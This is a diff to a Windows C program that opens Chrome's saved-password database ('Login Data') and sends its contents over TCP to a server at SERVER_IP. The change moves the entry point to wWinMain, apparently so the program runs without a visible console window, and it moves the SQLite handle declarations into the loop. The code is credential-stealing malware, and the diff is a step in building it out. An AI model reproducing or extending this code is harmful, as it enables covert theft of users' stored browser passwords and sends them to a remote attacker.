@@ -49,13 +49,8 @@ BOOL connect_to_serv(SOCKET* ConnectSocket);
 void sendData(char* data);
 void closeConnection();
 
-//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-int main() {
-	/* These variables are used to handle the database of chrome, which is Login Data */
-	sqlite3* handle_db;																		// Handle to SQLite Database handle
-	sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
-	int status;
-
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+//int main() {
 	/* Connect to the server */
 	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
 		return FALSE;
@@ -137,6 +132,9 @@ int main() {
 			sendData(tcp_send_buffer);
 
 			/* Open database connection */
+			sqlite3* handle_db;																		// Handle to SQLite Database handle
+			sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
+			int status;
 			if (!open_database_conn(chrome_dir_char, dir_files.cFileName, &handle_db)) {
 				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Error when opening database\n");
 				sendData(tcp_send_buffer);
@@ -359,4 +357,3 @@ void sendData(char* data) {
 	}
 	memset(data, 0, DEFAULT_BUFLEN);
 }
-
